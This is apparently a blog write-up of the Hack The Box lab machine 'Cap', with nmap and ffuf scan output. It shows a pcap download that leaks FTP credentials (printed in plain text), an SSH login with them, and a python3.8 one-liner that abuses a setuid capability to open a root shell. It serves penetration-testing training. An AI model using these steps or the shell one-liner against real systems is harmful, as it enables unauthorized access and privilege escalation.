---
title: HTB Cap - Writeup
date: "2021-07-23"
draft: false
tags: ["hackthebox", "machines", "web", "writeup"]
---

# Enumeration

## Nmap Scans

### Service Scan

```
# Nmap 7.91 scan initiated Fri Jul 16 20:44:02 2021 as: nmap -T4 -A -p21,22,80 -oA nmap/service-scan -Pn 10.10.10.245
Nmap scan report for 10.10.10.245
Host is up (0.068s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    gunicorn
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     Server: gunicorn
|     Date: Fri, 16 Jul 2021 15:14:15 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Fri, 16 Jul 2021 15:14:09 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 19386
|     <!DOCTYPE html>
|     <html class="no-js" lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Security Dashboard</title>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <link rel="shortcut icon" type="image/png" href="/static/images/icon/favicon.ico">
|     <link rel="stylesheet" href="/static/css/bootstrap.min.css">
|     <link rel="stylesheet" href="/static/css/font-awesome.min.css">
|     <link rel="stylesheet" href="/static/css/themify-icons.css">
|     <link rel="stylesheet" href="/static/css/metisMenu.css">
|     <link rel="stylesheet" href="/static/css/owl.carousel.min.css">
|     <link rel="stylesheet" href="/static/css/slicknav.min.css">
|     <!-- amchar
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Fri, 16 Jul 2021 15:14:09 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, OPTIONS, GET
|     Content-Length: 0
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Content-Type: text/html
|     Content-Length: 196
|     <html>
|     <head>
|     <title>Bad Request</title>
|     </head>
|     <body>
|     <h1><p>Bad Request</p></h1>
|     Invalid HTTP Version &#x27;Invalid HTTP Version: &#x27;RTSP/1.0&#x27;&#x27;
|     </body>
|_    </html>
|_http-server-header: gunicorn
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.91%I=7%D=7/16%Time=60F1A242%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,2FE5,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20
SF:Fri,\x2016\x20Jul\x202021\x2015:14:09\x20GMT\r\nConnection:\x20close\r\
SF:nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20193
SF:86\r\n\r\n<!DOCTYPE\x20html>\n<html\x20class=\"no-js\"\x20lang=\"en\">\
SF:n\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x2
SF:0<meta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\x20\
SF:x20\x20\x20<title>Security\x20Dashboard</title>\n\x20\x20\x20\x20<meta\
SF:x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-scale=
SF:1\">\n\x20\x20\x20\x20<link\x20rel=\"shortcut\x20icon\"\x20type=\"image
SF:/png\"\x20href=\"/static/images/icon/favicon\.ico\">\n\x20\x20\x20\x20<
SF:link\x20rel=\"stylesheet\"\x20href=\"/static/css/bootstrap\.min\.css\">
SF:\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/fon
SF:t-awesome\.min\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20
SF:href=\"/static/css/themify-icons\.css\">\n\x20\x20\x20\x20<link\x20rel=
SF:\"stylesheet\"\x20href=\"/static/css/metisMenu\.css\">\n\x20\x20\x20\x2
SF:0<link\x20rel=\"stylesheet\"\x20href=\"/static/css/owl\.carousel\.min\.
SF:css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/c
SF:ss/slicknav\.min\.css\">\n\x20\x20\x20\x20<!--\x20amchar")%r(HTTPOption
SF:s,B3,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Fri,\x2
SF:016\x20Jul\x202021\x2015:14:09\x20GMT\r\nConnection:\x20close\r\nConten
SF:t-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20HEAD,\x20OPTIONS,\x
SF:20GET\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,121,"HTTP/1\.1\x2
SF:0400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type:\x20text
SF:/html\r\nContent-Length:\x20196\r\n\r\n<html>\n\x20\x20<head>\n\x20\x20
SF:\x20\x20<title>Bad\x20Request</title>\n\x20\x20</head>\n\x20\x20<body>\
SF:n\x20\x20\x20\x20<h1><p>Bad\x20Request</p></h1>\n\x20\x20\x20\x20Invali
SF:d\x20HTTP\x20Version\x20&#x27;Invalid\x20HTTP\x20Version:\x20&#x27;RTSP
SF:/1\.0&#x27;&#x27;\n\x20\x20</body>\n</html>\n")%r(FourOhFourRequest,189
SF:,"HTTP/1\.0\x20404\x20NOT\x20FOUND\r\nServer:\x20gunicorn\r\nDate:\x20F
SF:ri,\x2016\x20Jul\x202021\x2015:14:15\x20GMT\r\nConnection:\x20close\r\n
SF:Content-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20232\
SF:r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x203\.2\x20
SF:Final//EN\">\n<title>404\x20Not\x20Found</title>\n<h1>Not\x20Found</h1>
SF:\n<p>The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20ser
SF:ver\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x20ch
SF:eck\x20your\x20spelling\x20and\x20try\x20again\.</p>\n");
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jul 16 20:47:13 2021 -- 1 IP address (1 host up) scanned in 190.95 seconds
```

- Port 21, 80 open

## Enumeration: Port 80

- gunicorn

### `/ip`

Runs `ifconfig` on the machine

![/img/cap/Pasted_image_20210716205953.png](/img/cap/Pasted_image_20210716205953.png)

### `/netstat`

Runs `netstat` on the machine

### `/capture`

Captures PCAP packets of the server and made available for download

### ffuf scan

```
$ ffuf -u <http://10.10.10.245/FUZZ> -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -r -v -c -ic -of html -o http/http-80-medium-no-ext.html

         /'___\\  /'___\\           /'___\\
        /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/
       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\
        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/
         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\
          \\/_/    \\/_/   \\/___/    \\/_/

       v1.3.0-git
________________________________________________

 :: Method           : GET
 :: URL              : <http://10.10.10.245/FUZZ>
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
 :: Output file      : http/http-80-medium-no-ext.html
 :: File format      : html
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

[Status: 200, Size: 19385, Words: 8716, Lines: 389]
| URL | <http://10.10.10.245/>
    * FUZZ:

[Status: 200, Size: 19385, Words: 8716, Lines: 389]
| URL | <http://10.10.10.245/data>
    * FUZZ: data

[Status: 200, Size: 17445, Words: 7275, Lines: 355]
| URL | <http://10.10.10.245/ip>
    * FUZZ: ip

[Status: 200, Size: 72923, Words: 36727, Lines: 768]
| URL | <http://10.10.10.245/netstat>
    * FUZZ: netstat

[Status: 200, Size: 19385, Words: 8716, Lines: 389]
| URL | <http://10.10.10.245/capture>
    * FUZZ: capture

[Status: 200, Size: 19385, Words: 8716, Lines: 389]
| URL | <http://10.10.10.245/>
    * FUZZ:

:: Progress: [207630/207630] :: Job [1/1] :: 633 req/sec :: Duration: [0:05:37] :: Errors: 0 ::

```

```
/
/data
/ip
/capture
/netstat

```

- The packets captured on `/capture` are available as `/data/1` and so forth. The number starts from 1.
- Opening `/data/0` being packet not captured by us. Might find something juicy.
- Downloading it and opening in wireshark
    
    ![/img/cap/Pasted_image_20210717190239.png](/img/cap/Pasted_image_20210717190239.png)
    
    ![/img/cap/Pasted_image_20210717190340.png](/img/cap/Pasted_image_20210717190340.png)
    

We get FTP id and password

```
nathan:Buck3tH4TF0RM3!
```

# Exploitation

## Getting shell

Using these credentials to login in using SSH, we get a shell

![/img/cap/Pasted_image_20210717190453.png](/img/cap/Pasted_image_20210717190453.png)

# Post Exploit Enumeration - User level

![/img/cap/Pasted_image_20210721202213.png](/img/cap/Pasted_image_20210721202213.png)

Linux Capabilities: *Linux capabilities provide a subset of the available root privileges to a process. This effectively breaks up root privileges into smaller and distinctive units. Each of these units can then be independently be granted to processes. This way the full set of privileges is reduced and decreasing the risks of exploitation.*

Further Reading → [https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities](https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities)

# Exploitation

```
python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```

![/img/cap/Pasted_image_20210722000148.png](/img/cap/Pasted_image_20210722000148.png)

![/img/cap/Pasted_image_20210722000201.png](/img/cap/Pasted_image_20210722000201.png)